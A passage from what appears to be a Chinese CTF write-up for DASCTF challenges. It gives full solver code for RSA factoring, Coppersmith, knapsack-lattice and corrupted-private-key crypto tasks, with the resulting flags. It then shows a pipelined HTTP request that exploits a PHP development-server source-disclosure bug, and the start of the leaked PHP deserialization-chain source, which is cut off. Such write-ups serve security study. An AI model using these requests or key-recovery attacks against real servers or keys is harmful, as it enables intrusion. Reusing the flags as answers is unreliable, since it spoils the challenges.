<span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> t % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            t //= <span class="number">2</span></span><br><span class="line">            x = <span class="built_in">pow</span>(g, t, n)</span><br><span class="line">            <span class="keyword">if</span> x &gt; <span class="number">1</span> <span class="keyword">and</span> gmpy2.gcd(x-<span class="number">1</span>, n) &gt; <span class="number">1</span>:</span><br><span class="line">                p = gmpy2.gcd(x-<span class="number">1</span>, n)</span><br><span class="line">                <span class="keyword">return</span> (p, n//p)</span><br><span class="line"></span><br><span class="line">n = <span class="number">80642592772746398646558097588687958541171131704233319344980232942965050635113860017117519166348100569115174644678997805783380130114530824798808098237628247236574959152847903491509751809336988273823686988619679739640305091291330211169194377552925908412183162787327977125388852329089751737463948165202565859373</span></span><br><span class="line">d = <span class="number">14218766449983537783699024084862960813708451888387858392014856544340557703876299258990323621963898510226357248200187173211121827541826897886277531706124228848229095880229718049075745233893843373402201077890407507625110061976931591596708901741146750809962128820611844426759462132623616118530705745098783140913</span></span><br><span class="line">e = <span class="number">13521</span></span><br><span class="line"></span><br><span class="line">p, q = divide_pq(e, d, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag: DASCTF&#123;%s&#125;&quot;</span> %md5(<span class="built_in">str</span>(p + q).encode()).hexdigest())</span><br><span class="line"></span><br><span class="line"><span class="comment"># Flag: DASCTF&#123;4ae33bea90f030bfddb7ac4d9222ef8f&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="MCeorpkpleer"><a href="#MCeorpkpleer" class="headerlink" title="MCeorpkpleer"></a>MCeorpkpleer</h3><blockquote><p>这数据都不全要怎么计算呢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params"><span class="built_in">list</span>, m, w</span>):</span><br><span class="line">    pubkey_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(e_bin)):</span><br><span class="line">        pubkey_list.append(w * <span class="built_in">list</span>[i] % m)</span><br><span class="line">    <span class="keyword">return</span> pubkey_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">e_cry</span>(<span class="params">e, pubkey</span>):</span><br><span class="line">    pubkey_list = pubkey</span><br><span class="line">    encode = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(e)):</span><br><span class="line">        encode += pubkey_list[i] * <span class="built_in">int</span>(e[i]) % m</span><br><span class="line">    <span class="keyword">return</span> encode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = getPrime(<span class="number">64</span>)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line">e_bin = (<span class="built_in">bin</span>(e))[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">list</span> = [<span class="built_in">pow</span>(<span class="number">3</span>, i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(e_bin))]</span><br><span class="line">m = getPrime(<span class="built_in">len</span>(<span class="built_in">bin</span>(<span class="built_in">sum</span>(<span class="built_in">list</span>))) - <span class="number">1</span>)</span><br><span class="line">w = getPrime(<span class="number">64</span>)</span><br><span class="line">pubkey = pubkey(<span class="built_in">list</span>, m, w)</span><br><span class="line">en_e = e_cry(e_bin, pubkey)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p = &#123;&#125;\n&#x27;</span></span><br><span class="line">      <span class="string">&#x27;n = &#123;&#125;\n&#x27;</span></span><br><span class="line">      <span class="string">&#x27;c = &#123;&#125;\n&#x27;</span></span><br><span class="line">      <span class="string">&#x27;pubkey = &#123;&#125;\n&#x27;</span></span><br><span class="line">      <span class="string">&#x27;en_e = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>((p &gt;&gt; <span class="number">435</span>) &lt;&lt; <span class="number">435</span>, n, c, pubkey, en_e))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 139540788452365306201344680691061363403552933527922544113532931871057569249632300961012384092481349965600565669315386312075890938848151802133991344036696488204791984307057923179655351110456639347861739783538289295071556484465877192913103980697449775104351723521120185802327587352171892429135110880845830815744</span></span><br><span class="line"><span class="string">n = 22687275367292715121023165106670108853938361902298846206862771935407158965874027802803638281495587478289987884478175402963651345721058971675312390474130344896656045501040131613951749912121302307319667377206302623735461295814304029815569792081676250351680394603150988291840152045153821466137945680377288968814340125983972875343193067740301088120701811835603840224481300390881804176310419837493233326574694092344562954466888826931087463507145512465506577802975542167456635224555763956520133324723112741833090389521889638959417580386320644108693480886579608925996338215190459826993010122431767343984393826487197759618771</span></span><br><span class="line"><span class="string">c = 156879727064293983713540449709354153986555741467040286464656817265584766312996642691830194777204718013294370729900795379967954637233360644687807499775502507899321601376211142933572536311131955278039722631021587570212889988642265055045777870448827343999745781892044969377246509539272350727171791700388478710290244365826497917791913803035343900620641430005143841479362493138179077146820182826098057144121231954895739989984846588790277051812053349488382941698352320246217038444944941841831556417341663611407424355426767987304941762716818718024107781873815837487744195004393262412593608463400216124753724777502286239464</span></span><br><span class="line"><span class="string">pubkey = [18143710780782459577, 54431132342347378731, 163293397027042136193, 489880191081126408579, 1469640573243379225737, 4408921719730137677211, 13226765159190413031633, 39680295477571239094899, 119040886432713717284697, 357122659298141151854091, 1071367977894423455562273, 3214103933683270366686819, 9642311801049811100060457, 28926935403149433300181371, 86780806209448299900544113, 260342418628344899701632339, 781027255885034699104897017, 2343081767655104097314691051, 7029245302965312291944073153, 21087735908895936875832219459, 63263207726687810627496658377, 189789623180063431882489975131, 569368869540190295647469925393, 1708106608620570886942409776179, 601827224419797931380408071500, 1805481673259393794141224214500, 893952418336266652976851386463, 2681857255008799958930554159389, 3523079163584485147344841221130, 1524252287869625983140881149316, 50264262166963219975822190911, 150792786500889659927466572733, 452378359502668979782399718199, 1357135078508006939347199154597, 4071405235524020818041597463791, 3169230503688232995231149877299, 462706308180869526799807117823, 1388118924542608580399421353469, 4164356773627825741198264060407, 3448085117999647764701149667147, 1299270151115113835209806487367, 3897810453345341505629419462101, 2648446157152195057994615872229, 3422845870014670444537026359650, 1223552407160181874717436564876, 3670657221480545624152309694628, 1966986461557807413563286569810, 1378466783231507511243038452393, 4135400349694522533729115357179, 3361215846199738142293703557463, 1038662335715384967987468158315, 3115987007146154903962404474945, 302975818554635252993570910761, 908927455663905758980712732283, 2726782366991717276942138196849, 3657854499533237101379593333510, 1928578295715881845245137486456, 1263242285705730806288591202331, 3789726857117192418865773606993, 2324195368467747797703678306905, 2450093503961328663664213663678, 2827787910442071261545819733997, 3960871129884299055190637944954, 2837628186769067706678271320788]</span></span><br><span class="line"><span class="string">en_e = 31087054322877663244023458448558</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>根据已知 $p$ 高位，用coppersmith算法恢复 $p$。</p><p>对于 $e$，已知 $s_i = w \cdot 3^i \bmod m$，已知 $3^i$ 和 $s_i$，未知 $w$ 和 $m$。</p><p>由 $\begin{cases} s_i = w \cdot 3^i \bmod m \newline s_{i+1} = w \cdot 3^{i+1} \bmod m \end{cases}$，即 $\begin{cases} w \cdot 3^i = s_i+k_1m \newline w \cdot 3^{i+1} = s_{i+1}+k_2m \end{cases}$，</p><p>两式相除，得 $(3s_i-s_{i+1})=(3k_1-k_2)m=km$，故求gcd可得 $m$，再按背包密码求解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">ph = </span><br><span class="line">N = </span><br><span class="line">c = </span><br><span class="line">pk = [...]</span><br><span class="line">ec = </span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(N))</span><br><span class="line">f = ph + x</span><br><span class="line">pl = f.small_roots(X=<span class="number">2</span>^<span class="number">435</span>, beta=<span class="number">0.4</span>)[<span class="number">0</span>]</span><br><span class="line">p = <span class="built_in">int</span>(ph+pl)</span><br><span class="line">q = N//p</span><br><span class="line"></span><br><span class="line">m = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(pk)-<span class="number">1</span>):</span><br><span class="line">    m = gcd(m, <span class="number">3</span>*pk[i]-pk[i+<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line">w = pk[<span class="number">0</span>]*inverse_mod(<span class="number">3</span>^<span class="number">0</span>,m)%m</span><br><span class="line"><span class="built_in">print</span>(w)</span><br><span class="line"></span><br><span class="line">ct =  ec</span><br><span class="line">n = <span class="built_in">len</span>(pk)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sanity check for application of low density attack</span></span><br><span class="line">d = n / log(<span class="built_in">max</span>(pk), <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(CDF(d))</span><br><span class="line"><span class="keyword">assert</span> CDF(d) &lt; <span class="number">0.9408</span></span><br><span class="line"></span><br><span class="line">M = Matrix.identity(n) * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">last_row = [<span class="number">1</span> <span class="keyword">for</span> x <span class="keyword">in</span> pk]</span><br><span class="line">M_last_row = Matrix(ZZ, <span class="number">1</span>, <span class="built_in">len</span>(last_row), last_row)</span><br><span class="line"></span><br><span class="line">last_col = pk</span><br><span class="line">last_col.append(ct)</span><br><span class="line">M_last_col = Matrix(ZZ, <span class="built_in">len</span>(last_col), <span class="number">1</span>, last_col)</span><br><span class="line"></span><br><span class="line">M = M.stack(M_last_row)</span><br><span class="line">M = M.augment(M_last_col)</span><br><span class="line"></span><br><span class="line">X = M.BKZ()</span><br><span class="line"></span><br><span class="line">sol = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n + <span class="number">1</span>):</span><br><span class="line">    testrow = X.row(i).<span class="built_in">list</span>()[:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">set</span>(testrow).issubset([-<span class="number">1</span>, <span class="number">1</span>]):</span><br><span class="line">        <span class="keyword">for</span> v <span class="keyword">in</span> testrow:</span><br><span class="line">            <span class="keyword">if</span> v == <span class="number">1</span>:</span><br><span class="line">                sol.append(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">elif</span> v == -<span class="number">1</span>:</span><br><span class="line">                sol.append(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">s = sol</span><br><span class="line">e = <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(k) <span class="keyword">for</span> k <span class="keyword">in</span> s]),<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="built_in">print</span>(e.bit_length())</span><br><span class="line"><span class="built_in">print</span>(is_prime(e))</span><br><span class="line"></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,N)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;DASCTF&#123;T81I_tPPS_6r7g_xlPi_OO3M_6vyV_Rkba&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="XOR贯穿始终"><a href="#XOR贯穿始终" class="headerlink" title="XOR贯穿始终"></a>XOR贯穿始终</h3><blockquote><p>一切都是有意义的，拿下它吧。</p></blockquote><p><code>massege.txt</code> 中为社会价值观编码，解码得压缩包密码：<code>C0ngr4tulati0n5_y0u_fou^d_m3</code>，注释：<code>钥匙先别扔掉，万一后面还有用呢</code>。</p><p><code>task.py</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> enflag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = q * p</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">e = getPrime(<span class="number">17</span>)</span><br><span class="line"><span class="keyword">assert</span> gcd(e, phi) == <span class="number">1</span></span><br><span class="line"><span class="comment"># 以上信息生成了私钥文件,但文件被损坏了你能提取有用信息吗</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(enflag, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c = &#x27;</span> + <span class="built_in">str</span>(c))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c = 91817924748361493215143897386603397612753451291462468066632608541316135642691873237492166541761504834463859351830616117238028454453831120079998631107520871612398404926417683282285787231775479511469825932022611941912754602165499500350038397852503264709127650106856760043956604644700201911063515109074933378818</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><code>pri.pem</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PRIVATE KEY-----</span><br><span class="line">MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALmtMy+2uH1ZtbIL</span><br><span class="line">SuiAukFthyQRH5mp7UmLyzZQkdg9zEP9/5tgffikQ7ytx5kHySHnazgAO1sOzmYE</span><br><span class="line">N4Axlev6uafiP8B1Eij97v5VkYJ1I9e3mtBNheTbXKoT8op+ASQ1fQaF4A8UzLuW</span><br><span class="line">eZeZI8JTH/SH+bolAK3kiZXDFdkTAgMBAAECgYEAl067LaC7Cvs2A5cMPhfYsESv</span><br><span class="line">IgcKN1CwW4Sd3u8dSphhgu7TgyzIuvwxbuo2g1BC6WwKhaI6vGN+csfw6nh98GEn</span><br><span class="line">/p3D0huNroAYvf/DRRB9UnHdttX7wB+Mv3P0RBDWHgBiCDVvHFuFUV78cIs0tnbn</span><br><span class="line">jxjU07aPV2XRC3AfA2ECQQDqWUNPVg3i6vTyHCL7EGkbeUheYpAAfcKCQrxjc5+5</span><br><span class="line">X6A+XtgHAA1JHwykPlCpHUOmlA85DJF1ejuoImzlgRLJAkEAytTCnQF+MN2r1gaA</span><br><span class="line">UETZyj5qMYT7Th8zKEVVVJjDawLnuX4usJ2FyRnjCkk86U75QSJhw5mMc0QnG25u</span><br><span class="line">Gz3++w==</span><br><span class="line">-----END PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>按照私钥结构，将私钥base64解码转hex分析：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">30820277</span> <span class="comment"># 多余部分</span></span><br><span class="line"></span><br><span class="line">0201 <span class="comment"># 多余部分</span></span><br><span class="line"><span class="number">00</span></span><br><span class="line"></span><br><span class="line">300d06092a864886f70d01010105000482 <span class="comment"># 多余部分</span></span><br><span class="line">0261</span><br><span class="line"></span><br><span class="line">3082025d <span class="comment"># 开始: 长度=0x025d</span></span><br><span class="line"></span><br><span class="line">0201 <span class="comment"># 版本：长度=0x01</span></span><br><span class="line"><span class="number">00</span></span><br><span class="line"></span><br><span class="line">028181 <span class="comment"># n：长度=0x81</span></span><br><span class="line">00b9ad332fb6b87d59b5b20b4ae880ba416d8724111f99a9ed498bcb365091d83dcc43fdff9b607df8a443bcadc79907c921e76b38003b5b0ece660437803195ebfab9a7e23fc0751228fdeefe5591827523d7b79ad04d85e4db5caa13f28a7e0124357d0685e00f14ccbb9679979923c2531ff487f9ba2500ade48995c315d913 <span class="comment"># n</span></span><br><span class="line"></span><br><span class="line">0203 <span class="comment"># e：长度=0x03</span></span><br><span class="line"><span class="number">0</span>10001 <span class="comment"># e</span></span><br><span class="line"></span><br><span class="line">028181 <span class="comment"># d：长度=0x81</span></span><br><span class="line">00974ebb2da0bb0afb3603970c3e17d8b044af22070a3750b05b849ddeef1d4a986182eed3832cc8bafc316eea36835042e96c0a85a23abc637e72c7f0ea787df06127fe9dc3d21b8dae8018bdffc345107d5271ddb6d5fbc01f8cbf73f44410d61e006208356f1c5b85515efc708b34b676e78f18d4d3b68f5765d10b701f0361 <span class="comment"># d</span></span><br><span class="line"></span><br><span class="line">0241 <span class="comment"># p：长度=0x41</span></span><br><span class="line">00ea59434f560de2eaf4f21c22fb10691b79485e6290007dc28242bc63739fb95fa03e5ed807000d491f0ca43e50a91d43a6940f390c91757a3ba8226ce58112c9 <span class="comment"># p</span></span><br><span class="line"></span><br><span class="line">0241 <span class="comment"># q：长度=0x41</span></span><br><span class="line">00cad4c29d017e30ddabd606805044d9ca3e6a3184fb4e1f332845555498c36b02e7b97e2eb09d85c919e30a493ce94ef9412261c3998c7344271b6e6e1b3dfefb <span class="comment"># q</span></span><br></pre></td></tr></table></figure><p>解RSA：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">91817924748361493215143897386603397612753451291462468066632608541316135642691873237492166541761504834463859351830616117238028454453831120079998631107520871612398404926417683282285787231775479511469825932022611941912754602165499500350038397852503264709127650106856760043956604644700201911063515109074933378818</span></span><br><span class="line">p = <span class="number">0x00ea59434f560de2eaf4f21c22fb10691b79485e6290007dc28242bc63739fb95fa03e5ed807000d491f0ca43e50a91d43a6940f390c91757a3ba8226ce58112c9</span></span><br><span class="line">q = <span class="number">0x00cad4c29d017e30ddabd606805044d9ca3e6a3184fb4e1f332845555498c36b02e7b97e2eb09d85c919e30a493ce94ef9412261c3998c7344271b6e6e1b3dfefb</span></span><br><span class="line">n = <span class="number">0xb9ad332fb6b87d59b5b20b4ae880ba416d8724111f99a9ed498bcb365091d83dcc43fdff9b607df8a443bcadc79907c921e76b38003b5b0ece660437803195ebfab9a7e23fc0751228fdeefe5591827523d7b79ad04d85e4db5caa13f28a7e0124357d0685e00f14ccbb9679979923c2531ff487f9ba2500ade48995c315d913</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"><span class="built_in">print</span>(is_prime(p))</span><br><span class="line"><span class="built_in">print</span>(is_prime(q))</span><br><span class="line"></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = <span class="number">0x974ebb2da0bb0afb3603970c3e17d8b044af22070a3750b05b849ddeef1d4a986182eed3832cc8bafc316eea36835042e96c0a85a23abc637e72c7f0ea787df06127fe9dc3d21b8dae8018bdffc345107d5271ddb6d5fbc01f8cbf73f44410d61e006208356f1c5b85515efc708b34b676e78f18d4d3b68f5765d10b701f0361</span></span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">x = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;DASCTF&#123;0e287wQ\x08R\x17\x00FGXYFZ\x07V\x03kIUCn\x02VDg\x01f\x0cN&#x27;</span></span><br></pre></td></tr></table></figure><p>结合压缩包注释，将结果与压缩包密码<code>C0ngr4tulati0n5_y0u_fou^d_m3</code> 高位补 <code>\x00</code>，</p><p>右对齐异或得flag：<code>DASCTF&#123;0e2874af5e422482378640e61d919e9a&#125;</code>。</p><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="D0n’t-pl4y-g4m3-FIX"><a href="#D0n’t-pl4y-g4m3-FIX" class="headerlink" title="D0n’t pl4y g4m3!!! -FIX"></a>D0n’t pl4y g4m3!!! -FIX</h3><blockquote><p>小明不小心沉迷⚪⚪的东西把源码和猫猫搞丢了，请帮他找回来。请访问/p0p.php</p></blockquote><p>bp访问 <code>/p0p.php</code>，提示：<code># ./有hint.zip</code>，</p><p>访问 <code>hint.zip</code> ，<a href="https://zdjd.vercel.app/">在线尊嘟假嘟解码</a>，得 <code>flag在/tmp/catcatf1ag.txt</code>。</p><p>查看首页发现使用了PHP Development Server，当PHP&lt;=7.4.21时Development Server存在源码泄露漏洞（CNVD-2023-05738），该漏洞源于php cli server begin send static在解析http请求时存在逻辑漏洞，攻击者可利用该漏洞将两个请求拼接至一个http请求中导致服务器将php文件作为静态文件返回。</p><p>构造请求走私：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/p0p.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>tcp.cloud.dasctf.com:20294</span><br><span class="line"></span><br><span class="line"><span class="language-http"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span></span><br><span class="line"><span class="language-http"></span></span><br></pre></td></tr></table></figure><p>拿到 <code>p0p.php</code> 的源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 302 found&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:https://passer-by.com/pacman/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pro</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$exp</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$rce2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$rce2</span>=<span class="variable language_">$this</span>-&gt;exp[<span class="variable">$rce2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;system&#x27;</span>, <span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yang</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$ary</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key === <span class="literal">true</span> || <span class="variable language_">$this</span>-&gt;finish1-&gt;name) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;finish-&gt;finish) &#123;</span><br><span class="line">                <span class="title function_ invoke__">call_user_func</span>(<span 